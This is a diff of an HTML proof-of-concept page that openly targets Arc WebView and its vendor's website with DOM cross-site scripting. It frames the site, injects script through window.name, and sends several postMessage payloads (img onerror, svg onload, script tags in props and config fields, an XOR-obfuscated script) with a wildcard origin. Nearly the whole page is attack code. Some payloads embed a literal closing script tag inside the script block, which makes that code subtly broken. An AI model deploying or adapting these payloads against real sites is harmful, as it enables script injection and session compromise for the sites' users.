@@ -2,24 +2,92 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>🔥 Arc WebView Exploit</title>
+  <title>🔥 Arc XSS Exploit – Multi Vector</title>
+  <style>
+    body { background: #111; color: #0f0; font-family: monospace; padding: 1rem; }
+  </style>
 </head>
 <body>
-  <h2>🚀 Arc WebView XSS via postMessage</h2>
-  <p>If this page is opened inside Arc WebView, it will trigger an XSS.</p>
 
-  <script>
-    const payload = {
-      type: "arc_webview_init",
-      html: `<img src=x onerror=alert('🔥 WebView XSS in Arc')>`
-    };
+<h2>🚀 Multi-Vector DOM XSS PoC for Arc WebView</h2>
+<p>This PoC sends multiple XSS payloads via <code>postMessage</code> and <code>window.name</code> to trigger XSS inside <strong>Arc WebView</strong> or <strong>iframe sinks</strong>.</p>
 
+<iframe id="target" src="https://thebrowser.company/" width="100%" height="600" style="border: 2px solid lime;" sandbox="allow-scripts allow-same-origin"></iframe>
+
+<script>
+const iframe = document.getElementById("target");
+
+// Multiple payloads for different contexts
+const payloads = [
+  // MarketerId-based sink
+  {
+    message: "OB_SHOULD_SHOW_PICKER",
+    content: {
+      marketerId: [
+        `<img src=x onerror=alert('🔥 XSS via marketerId')>`
+      ]
+    }
+  },
+
+  // React props dangerouslySetInnerHTML
+  {
+    props: {
+      __html: `<script>alert('🔥 XSS via __html')</script>`
+    }
+  },
+
+  // SVG-based payload
+  {
+    type: "arc_webview_init",
+    html: `<svg/onload=alert('🔥 XSS via svg')>`
+  },
+
+  // Config injection style
+  {
+    config: {
+      injection: {
+        content: `<script>alert('🔥 XSS via config')</script>`
+      }
+    }
+  }
+];
+
+// XOR encoder
+function xorEncode(str, key = 0x66) {
+  const keyHex = key.toString(16).padStart(2, '0');
+  return keyHex + Array.from(str).map(c =>
+    (c.charCodeAt(0) ^ key).toString(16).padStart(2, '0')
+  ).join('');
+}
+
+const xorPayload = xorEncode(`<script>alert('🔥 XSS via XOR')</script>`);
+
+iframe.onload = () => {
+  console.log("✅ iframe loaded");
+
+  // 1. window.name injection
+  try {
+    iframe.contentWindow.name = JSON.stringify({ props: { __html: `<script>alert('🔥 XSS via window.name')</script>` } });
+    console.log("📦 window.name set.");
+  } catch (e) {
+    console.warn("⚠️ Failed to set window.name:", e);
+  }
+
+  // 2. XOR postMessage
+  setTimeout(() => {
+    iframe.contentWindow.postMessage(xorPayload, "*");
+    console.log("🚀 XOR payload sent");
+  }, 1000);
+
+  // 3. Structured payloads
+  payloads.forEach((p, i) => {
     setTimeout(() => {
-      window.parent.postMessage(payload, "*");
-      window.top.postMessage(payload, "*");
-      window.opener?.postMessage(payload, "*");
-      console.log("🚀 postMessage sent to Arc WebView");
-    }, 2000);
-  </script>
+      iframe.contentWindow.postMessage(p, "*");
+      console.log(`🚀 Payload ${i + 1} sent`);
+    }, 1500 + i * 1000);
+  });
+};
+</script>
+
 </body>
 </html>
